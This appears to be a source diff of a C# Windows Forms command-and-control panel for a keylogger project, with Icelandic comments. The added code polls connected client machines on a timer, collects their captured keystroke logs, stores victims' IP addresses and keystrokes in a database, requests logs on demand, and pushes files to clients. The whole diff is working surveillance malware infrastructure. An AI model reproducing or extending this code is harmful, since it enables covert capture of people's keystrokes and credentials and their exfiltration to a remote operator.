@@ -8,26 +8,95 @@ using System.Text;
 using System.IO;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Timers;
+using Timer = System.Timers.Timer;
 using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 
+
 namespace ForKeyLoggerProject
 {
-
+    
     public partial class Main : Form
     {
+        
         int port;
         int online = 0;
+        int fileportnumber;
         Thread listenerThread;
         TcpListener listener;
         string file;
         static string usernambes = null;
         public static string ipaddress1;
+
+        public static Timer aTimer = new Timer(10000);
+        List<string> copy = new List<string>();
+        ListViewItem copy1 = new ListViewItem();
+        public DateTime now = DateTime.Now;
+        public bool klogscollected = false;
+        public bool upploaddatatodbautomatic = false;
+        public string loggggsss;
+        Ggrunntenging.ggrunnur gagnagrunnur = new Ggrunntenging.ggrunnur();
+
         public Main()
         {
             InitializeComponent();
+            Thread starter3 = new Thread(Starting3);
+            starter3.Start();
         }
+        public void Starting3() 
+        {
+            aTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
+            aTimer.Enabled = true;
+        }
+ 
+        public void OnTimedEvent(object sender, EventArgs e)
+        {
+            string[] items = new string[] { lstBoxUsers.Items.Count + 1.ToString()};
+
+            if (lstBoxUsers.InvokeRequired)
+            {
+                lstBoxUsers.Invoke((MethodInvoker)delegate ()
+                {
+                    foreach (ListViewItem item in lstBoxUsers.Items)
+                    {
+                        Connection client = (Connection)item.Tag;
+                        client.Send("CONNECTSTATUS|");
+                        DateTime now = DateTime.Now;
+                        lbllastupdate.Text = "Last Broadcast: " + now.ToString("MM-dd-HH:mm:ss");
+
+                    }
+
+                });
+            }
+            aTimer.Stop();
+            aTimer.Start();
+        }
+        /*
+        delegate void SetTextCallback(string text);
+        
+        private void SetText(string text)
+        {
+            // InvokeRequired required compares the thread ID of the
+            // calling thread to the thread ID of the creating thread.
+            // If these threads are different, it returns true.
+            if (this.lstBoxUsers.InvokeRequired)
+            {
+                SetTextCallback d = new SetTextCallback(SetText);
+                this.Invoke(d, new object[] { text });
+                foreach (ListViewItem item in lstBoxUsers.Items)
+                {
+                    Connection client = (Connection)item.Tag;
+                    client.Send("CONNECTSTATUS|");
+                }
+            }
+            else
+            {
+                
+            }
+        }
+        */
 
         private void btnListen_Click(object sender, EventArgs e) //listen takkinn
         {
@@ -79,14 +148,55 @@ namespace ForKeyLoggerProject
         delegate void _Logs(Connection client, String log); //tekur á móti keyloggs textanum og setur í textbox
         void log(Connection client, String log)
         {
+            klogscollected = true;
             txtBoxKeyLogs.Text = txtBoxKeyLogs.Text + log;
-            /*
-            foreach (ListViewItem item in listView1.Items)
+            string hello = "hello".ToString();
+            foreach (ListViewItem item in lstBoxUsers.Items)
+            {
+                string[] cut = log.Split('~');
+                if (true)
+                {
+                    txtBoxKeyLogs.Text = txtBoxKeyLogs.Text + cut[1] + "\r\n";
+                    loggggsss = cut[1].ToString();
+                    if (upploaddatatodbautomatic == true)
+                    {
+                        string ipnumbre = lstBoxUsers.ToString();
+                        string ipnumber;
+                        string ipnumber2;
+                        string[] cut2 = ipnumbre.Split('{');
+                        ipnumber2 = cut2[1];
+                        string[] cut3 = ipnumber2.Split('}');
+                        ipnumber = cut3[0];
+
+                        string statrus = lstBoxUsers.Items[0].SubItems[1].ToString();
+                        string status;
+                        string status2;
+                        string[] skera = statrus.Split('{');
+                        status2 = skera[1];
+                        string[] skera2 = status2.Split('}');
+                        status = skera2[0];
+
+                        gagnagrunnur.addLog(ipnumber, loggggsss);
+                    }
+                }
+                txtBoxKeyLogs.ScrollBars = ScrollBars.Vertical;
+                //lstBoxUsers.Items[0].SubItems[0].ToString()
+                /*
+                switch (cut[1]) //skilaboð sem serverinn getur tekið á móti
+                {
+                    //case lstBoxUsers.Items[0].SubItems[1].ToString():
+                    if 
+                    
+                    case hello:
+                        Invoke(new _AddClient(AddClient), client, null);
+                        break;
+                }
                 if ((Connection)item.Tag == client)
                 {
                     item.SubItems[1].Text = log;
-                    break;
                 }*/
+            }
+
         }
         // Hérna er clientunum sem eru ekki tengd hent út
         void clientConnection_DisconnectedEvent(Connection client)
@@ -144,6 +254,11 @@ namespace ForKeyLoggerProject
                 if ((Connection)item.Tag == client)
                 {
                     item.SubItems[1].Text = Status;
+                    if (upploaddatatodbautomatic == true)
+                    {
+                       // gagnagrunnur.statusUpdate(lstBoxUsers.Items[0].SubItems[0].ToString(), lstBoxUsers.Items[0].SubItems[1].ToString());
+
+                    }
                     break; 
                 }
 
@@ -196,6 +311,7 @@ namespace ForKeyLoggerProject
         {
             foreach (ListViewItem item in lstBoxUsers.Items)
             {
+                txtBoxKeyLogs.Clear();
                 Connection client = (Connection)item.Tag;
                 client.Send("GETLOGS|");
             }
@@ -248,18 +364,20 @@ namespace ForKeyLoggerProject
                     }
                 }
             }
+            panel2.BackColor = Color.Green;
             button2.Enabled = true;
         }
 
         private void button2_Click(object sender, EventArgs e)
         {
+            fileportnumber = int.Parse(tboxportnumber.Text);
             foreach (ListViewItem item in lstBoxUsers.Items)
             {
                 Connection client = (Connection)item.Tag;
                 lstBoxUsers.Items[0].SubItems[1].Text = "Data: Sent";
                 lstBoxUsers.Update();
                 ipaddress1 = client.IPAddress;
-                client.Send("FILE|");
+                client.Send("FILE|" + fileportnumber.ToString());
                 SendFile(file);
             }
             btnChangeBG.Enabled = true; 
@@ -308,6 +426,72 @@ namespace ForKeyLoggerProject
             {
                 Connection client = (Connection)item.Tag;
                 client.Send("STOP|");
+            }
+        }
+
+
+        public static void errors(string error)
+        {
+            MessageBox.Show(error.ToString());
+            
+            
+        }
+        
+
+        private void button4_Click(object sender, EventArgs e)
+        {
+            
+
+            try
+            {
+                foreach (ListViewItem item in lstBoxUsers.Items)
+                {
+                    //lstBoxUsers.Items[0].SubItems[1].Text = "BG Change: Sent";
+                    //lstBoxUsers.Items[0].SubItems[0].ToString()
+                    
+                    string ipnumbre = lstBoxUsers.ToString();
+                    string ipnumber;
+                    string ipnumber2;
+                    string[] cut = ipnumbre.Split('{');
+                    ipnumber2 = cut[1];
+                    string[] cut1 = ipnumber2.Split('}');
+                    ipnumber = cut1[0];
+
+                    string statrus = lstBoxUsers.Items[0].SubItems[1].ToString();
+                    string status;
+                    string status2;
+                    string[] skera = statrus.Split('{');
+                    status2 = skera[1];
+                    string[] skera2 = status2.Split('}');
+                    status = skera2[0];
+
+                    gagnagrunnur.addLogger(ipnumber); //setur ip töluna inn
+                    Thread.Sleep(100);
+                    //gagnagrunnur.statusUpdate(lstBoxUsers.Items[0].SubItems[0].ToString(), lstBoxUsers.Items[0].SubItems[1].ToString());
+                    Thread.Sleep(100);
+                    if (klogscollected == true)
+                    {
+                        gagnagrunnur.addLog(ipnumber, loggggsss); //setur logg inn
+                    }
+
+                    panel1.BackColor = Color.Green;
+                    upploaddatatodbautomatic = true;
+                }
+            }
+            catch (Exception)
+            {
+                panel1.BackColor = Color.Red;
+
+            }
+            
+            
+        }
+
+        private void button5_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in lstBoxUsers.Items)
+            {
+                //gagnagrunnur.clearActive();
             }
         }
     }
